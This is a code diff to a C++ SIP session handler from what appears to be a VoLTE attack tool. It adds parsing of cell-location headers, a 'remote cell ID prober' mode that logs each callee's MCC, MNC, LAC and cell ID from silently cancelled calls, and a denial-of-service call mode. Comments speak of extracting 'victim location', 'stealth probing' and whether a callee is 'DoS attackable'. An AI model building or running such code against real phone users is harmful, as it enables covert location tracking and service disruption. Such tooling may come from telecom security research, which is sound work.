@@ -31,6 +31,13 @@
 constexpr size_t BUFFER_THRESHOLD = 1 << 16;
 
 namespace {
+  struct ParsedCellInfo {
+    int mcc;
+    int mnc;
+    int lac;
+    int cid;
+  };
+
 #pragma pack(push)
 #pragma pack(1)
   struct ESPHeader {
@@ -70,6 +77,31 @@ namespace {
     const auto last = input.find_last_not_of(" \t\r\n");
     return input.substr(first, last - first + 1);
   }
+
+  std::optional<ParsedCellInfo> parseCellInfoFromSip(const std::string& fullbody) {
+    static const std::regex networkInfoRegex(
+      R"((?:(?:Cellular-Network-Info)|(?:P-Access-Network-Info)):\s*([^;]+);[\s\S]*?utran-cell-id-3gpp=([A-Fa-f0-9]+))",
+      std::regex_constants::ECMAScript
+    );
+    static const std::regex cellIdRegex(R"(^([0-9A-Fa-f]{3})([0-9A-Fa-f]{2})([0-9A-Fa-f]{4})([0-9A-Fa-f]+)$)");
+
+    std::smatch match;
+    if (!std::regex_search(fullbody, match, networkInfoRegex) || match.size() < 3) {
+      return std::nullopt;
+    }
+
+    const std::string cellIdHex = match[2].str();
+    if (!std::regex_match(cellIdHex, match, cellIdRegex) || match.size() < 5) {
+      return std::nullopt;
+    }
+
+    ParsedCellInfo parsed{};
+    parsed.mcc = std::stoi(match[1].str());
+    parsed.mnc = std::stoi(match[2].str());
+    parsed.lac = static_cast<int>(std::stoul(match[3].str(), nullptr, 16));
+    parsed.cid = static_cast<int>(std::stoull(match[4].str(), nullptr, 16));
+    return parsed;
+  }
 }  // namespace
 
 Session::Session(const std::string& iface)
@@ -97,6 +129,19 @@ Session::~Session() {
   delete[] sendBuffer;
   shutdown(sock, SHUT_RDWR);
   close(sock);
+}
+
+void Session::setSipState(SipState next, const char* reason) {
+  if (currentSipState == next) return;
+  if (util::context.verbose) {
+    std::cout << "[fsm] " << sipStateToString(currentSipState)
+              << " -> " << sipStateToString(next);
+    if (reason != nullptr && reason[0] != '\0') {
+      std::cout << " reason=" << reason;
+    }
+    std::cout << std::endl;
+  }
+  currentSipState = next;
 }
 
 void Session::run(ESPConfig&& cfg, Application& application) {
@@ -345,10 +390,6 @@ bool Session::dissectSIP(std::span<uint8_t> buffer, bool receivePacket) {
     // if (util::context.verbose > 2) 
     std::cout << "calleeId: " << state.calleeId << std::endl;
   }
-  
-  // Extract vicitm location
-  Application::extractCellularInfo(fullbody, state.calleeId);
- 
 
   std::string sipHead(buffer.begin(), buffer.end());
   int status = 0;
@@ -404,6 +445,13 @@ bool Session::dissectSIP(std::span<uint8_t> buffer, bool receivePacket) {
     }
   }
 
+  if (!util::context.remoteCellIDProber) {
+    // Keep legacy cellular extraction behavior for non-probe-app modes.
+    Application::extractCellularInfo(fullbody, state.calleeId);
+  }
+
+  const auto parsedCellInfo = (status > 0) ? parseCellInfoFromSip(fullbody) : std::nullopt;
+
   auto now = std::chrono::steady_clock::now();
   if (status == 100) {
     state.t_trying = now;
@@ -424,9 +472,9 @@ bool Session::dissectSIP(std::span<uint8_t> buffer, bool receivePacket) {
 
   if (status == 183) {
     // Session progress
-    if (currentSipState == SipState::INVITE) currentSipState = SipState::SPROG;
+    if (currentSipState == SipState::INVITE) setSipState(SipState::SPROG, "183 provisional");
     if (currentSipState == SipState::PRACK && currentSipApp == SipApp::DOS) {
-      currentSipState = SipState::SPROG; // FET: 2 SPRGO -> RING, TWM: RING
+      setSipState(SipState::SPROG, "183 after PRACK in DOS"); // FET: 2 SPRGO -> RING, TWM: RING
     }
     
     if (std::regex_search(fullbody, match, toTag)) {
@@ -447,6 +495,7 @@ bool Session::dissectSIP(std::span<uint8_t> buffer, bool receivePacket) {
     }
     if (!state.t_pr.has_value()) {
       state.t_pr = now;
+      state.firstProvisionalStatus = 183;
       if (state.t_invite.has_value()) {
         auto delta = std::chrono::duration_cast<std::chrono::milliseconds>(*state.t_pr - *state.t_invite).count();
         std::cout << "[intercarrier] delta_ms=" << delta << " invite=" << std::chrono::duration_cast<std::chrono::milliseconds>(state.t_invite->time_since_epoch()).count() << " pr=" << std::chrono::duration_cast<std::chrono::milliseconds>(state.t_pr->time_since_epoch()).count() << std::endl;
@@ -460,13 +509,22 @@ bool Session::dissectSIP(std::span<uint8_t> buffer, bool receivePacket) {
         std::cout << "[intercarrier] delta_ms=unknown (no INVITE timestamp)" << std::endl;
       }
     }
-    // cancel immediately for stealth probing
-    currentSipState = SipState::CANCEL;
+    // For DoS probing, keep PRACK/SPROG progression and let CallDoS rollover
+    // based on carrier threshold instead of immediate cancel on every 183.
+    // For non-DoS flows, preserve immediate cancel behavior.
+    if (currentSipApp == SipApp::DOS) {
+      if (util::context.verbose > 1) {
+        std::cout << "[fsm] hold DOS provisional flow on 183 (no immediate CANCEL)" << std::endl;
+      }
+    } else {
+      setSipState(SipState::CANCEL, "183 received, send CANCEL");
+    }
   }
   else if (status == 180) {
     // Ringing
     if (!state.t_pr.has_value()) {
       state.t_pr = now;
+      state.firstProvisionalStatus = 180;
       if (state.t_invite.has_value()) {
         auto delta = std::chrono::duration_cast<std::chrono::milliseconds>(*state.t_pr - *state.t_invite).count();
         std::cout << "[intercarrier] delta_ms=" << delta << " invite=" << std::chrono::duration_cast<std::chrono::milliseconds>(state.t_invite->time_since_epoch()).count() << " pr=" << std::chrono::duration_cast<std::chrono::milliseconds>(state.t_pr->time_since_epoch()).count() << std::endl;
@@ -480,41 +538,41 @@ bool Session::dissectSIP(std::span<uint8_t> buffer, bool receivePacket) {
         std::cout << "[intercarrier] delta_ms=unknown (no INVITE timestamp)" << std::endl;
       }
     }
-    currentSipState = SipState::CANCEL;
+    setSipState(SipState::CANCEL, "180 ringing, send CANCEL");
     state.calleeDoSAttackable[state.calleeId] = true;
   }
   else if (status == 181) {
     // Call Being Forwarded
-    currentSipState = SipState::CANCEL;
+    setSipState(SipState::CANCEL, "181 forwarded, send CANCEL");
     state.calleeDoSAttackable[state.calleeId] = false;
   }
   else if (status == 200 && currentSipState == SipState::PRACK) {
     // OK (PRACK)
-    currentSipState = SipState::CANCEL;
+    setSipState(SipState::CANCEL, "200 after PRACK");
     if (currentSipApp == SipApp::MUTICALL && currentSipState == SipState::REQUESTERMINATE) {
-      currentSipState = SipState::ACK;
+      setSipState(SipState::ACK, "multicall terminate acknowledged");
     }
   }
   else if (status == 200 && state.retryInvitePending) {
     // CANCEL completed for timeout/busy retry path; proceed to fresh INVITE stage.
-    currentSipState = SipState::BUSY;
+    setSipState(SipState::BUSY, "200 after CANCEL during retry");
   }
   else if (status == 486 || status == 500 || status == 408) {
     // Busy
-    currentSipState = SipState::BUSY;
+    setSipState(SipState::BUSY, "busy/timeout response");
     state.retryImmediate = true;
   }
   else if (status == 401 || status == 407) {
     // Unauthorized / Proxy Authentication Required.
     // In DoS probing mode we don't complete SIP auth here, so force a retry cycle.
     if (state.retryInvitePending) {
-      currentSipState = SipState::BUSY;
+      setSipState(SipState::BUSY, "auth response while retry pending");
     }
     else if (currentSipApp == SipApp::DOS) {
-      currentSipState = SipState::BUSY;
+      setSipState(SipState::BUSY, "auth response in DOS");
       state.retryImmediate = true;
     } else {
-      currentSipState = SipState::ACK;
+      setSipState(SipState::ACK, "auth response outside DOS");
     }
   }
   else if (status == 481) {
@@ -522,30 +580,51 @@ bool Session::dissectSIP(std::span<uint8_t> buffer, bool receivePacket) {
     // For DoS probing, this should continue probing instead of ending the app flow.
     if (state.retryInvitePending) {
       // We were waiting for old leg termination before sending fresh INVITE.
-      currentSipState = SipState::BUSY;
+      setSipState(SipState::BUSY, "481 while retry pending");
     }
     else if (currentSipApp == SipApp::DOS) {
       // Treat as retryable failure, same class as timeout/busy.
-      currentSipState = SipState::BUSY;
+      setSipState(SipState::BUSY, "481 in DOS");
       state.retryImmediate = true;
     } else {
-      currentSipState = SipState::ACK;
+      setSipState(SipState::ACK, "481 outside DOS");
     }
   }
   else if (status == 487 ) {
     // 487: Request Terminated
     if (state.retryInvitePending) {
-      currentSipState = SipState::BUSY;
+      setSipState(SipState::BUSY, "487 while retry pending");
     }
     else if (currentSipApp == SipApp::DOS)  {
-      currentSipState = SipState::SPROG;
+      setSipState(SipState::SPROG, "487 in DOS");
     } else {
-      currentSipState = SipState::ACK;
+      setSipState(SipState::ACK, "487 outside DOS");
     }
   }
-  
 
-  
+  if (util::context.remoteCellIDProber &&
+      !state.probeEventEmitted &&
+      parsedCellInfo.has_value() &&
+      state.t_invite.has_value() &&
+      state.t_pr.has_value()) {
+    const auto inviteMs = std::chrono::duration_cast<std::chrono::milliseconds>(state.t_invite->time_since_epoch()).count();
+    const auto prMs = std::chrono::duration_cast<std::chrono::milliseconds>(state.t_pr->time_since_epoch()).count();
+    const auto delta = std::chrono::duration_cast<std::chrono::milliseconds>(*state.t_pr - *state.t_invite).count();
+    const int eventStatus = state.firstProvisionalStatus > 0 ? state.firstProvisionalStatus : status;
+    const auto& cell = *parsedCellInfo;
+    std::cout << "[probe_event] call_id=" << state.activeInviteCallId
+              << " status=" << eventStatus
+              << " delta_ms=" << delta
+              << " invite_ms=" << inviteMs
+              << " pr_ms=" << prMs
+              << " mcc=" << cell.mcc
+              << " mnc=" << cell.mnc
+              << " lac=" << cell.lac
+              << " cid=" << cell.cid
+              << std::endl;
+    state.probeEventEmitted = true;
+  }
+
   return true;
 }
 
